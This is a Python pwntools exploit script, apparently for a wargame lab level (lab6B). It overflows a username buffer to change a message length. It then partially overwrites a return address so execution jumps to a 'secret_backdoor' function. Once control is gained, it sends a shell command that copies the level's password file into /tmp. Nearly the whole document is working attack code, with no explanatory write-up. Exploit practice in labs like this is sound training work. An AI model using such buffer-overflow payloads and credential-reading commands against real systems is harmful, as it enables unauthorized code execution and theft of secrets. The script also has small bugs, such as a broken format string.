# import sys
import argparse
from pwn import *

def exploit():
        msgLenOverwrite = p8(0x41)*40 + p8(0xc6)
        p.sendlineafter("Enter your username\n", msgLenOverwrite)
        payload = p8(0x42) * 196
        #payload += p32(0x44444444) 
        payload += p8(0x2b)+ p8(0xa7) # our new two least significant bytes
		# so the final RVA will change from main+40 to secret_backdoor
		# which also means we want only and exactly 198 bytes written
        p.sendlineafter("Tweet @Unix-Dude\n", payload)
        print("Done, sending the command")
        p.clean()
        try:
                p.sendline("id; cat /home/lab6B/.pass > /tmp/corb3nik.dump;ls ")
                print("Command sent")
                print p.recvline()
                print p.recvline()

        except:
                pass


if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}


    #context.log_level = 'error'
    context.log_level = 'debug'
    while True:
        p = process([args.binary])
        print(pidof(p))
        raw_input("Open up another console session and attach to gdb, add any additional breakpoints if you want and/or press Enter to continue.") # added this so the spawneed PID can be manually attached to with gdb before the input is sent to the target
        exploit()
        p.close()
